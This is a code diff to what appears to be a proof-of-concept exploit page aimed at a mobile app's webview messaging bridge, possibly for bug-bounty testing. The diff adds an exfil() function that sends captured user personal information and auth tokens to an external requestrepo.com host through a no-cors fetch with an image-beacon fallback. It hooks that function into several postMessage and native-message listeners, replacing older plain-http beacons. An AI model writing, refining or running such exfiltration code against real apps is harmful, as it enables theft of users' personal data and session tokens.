@@ -13,6 +13,16 @@ function log(msg) {
   console.log(msg);
 }
 
+function exfil(tag, data) {
+  var payload = encodeURIComponent(JSON.stringify(data));
+  // Primary: fetch over HTTPS (no mixed content issue)
+  try {
+    fetch('https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload, {mode: 'no-cors'});
+  } catch(_) {}
+  // Fallback: HTTPS image beacon
+  new Image().src = 'https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload;
+}
+
 // Listen for response FIRST, before sending
 function setupListeners() {
   // Path 1: postMessage response
@@ -24,13 +34,12 @@ function setupListeners() {
         statusEl.textContent = 'GOT USER INFO!';
         log('=== PII LEAKED ===');
         log(JSON.stringify(data, null, 2));
-        // Exfil
-        var img = new Image();
-        img.src = 'http://9liv9n84.requestrepo.com/poc?d=' + encodeURIComponent(JSON.stringify(data));
+        exfil('poc', data);
       }
       if (data.event === 'ON_TOKEN' || data.event === 'ON_GET_TOKEN') {
         log('=== TOKEN LEAKED ===');
         log(JSON.stringify(data, null, 2));
+        exfil('poc_token', data);
       }
     } catch(ex) {
       log('parse error: ' + ex.message);
@@ -42,8 +51,7 @@ function setupListeners() {
     log('[nativeMessage event] ' + JSON.stringify(e.detail));
     if (e.detail) {
       statusEl.textContent = 'GOT NATIVE MESSAGE!';
-      var img = new Image();
-      img.src = 'http://9liv9n84.requestrepo.com/poc2?d=' + encodeURIComponent(JSON.stringify(e.detail));
+      exfil('poc2', e.detail);
     }
   });
 
@@ -51,8 +59,7 @@ function setupListeners() {
   window.handleNativeMessage = function(data) {
     log('[handleNativeMessage] ' + JSON.stringify(data));
     statusEl.textContent = 'GOT NATIVE MESSAGE (handler)!';
-    var img = new Image();
-    img.src = 'http://9liv9n84.requestrepo.com/poc3?d=' + encodeURIComponent(JSON.stringify(data));
+    exfil('poc3', data);
   };
 }
 
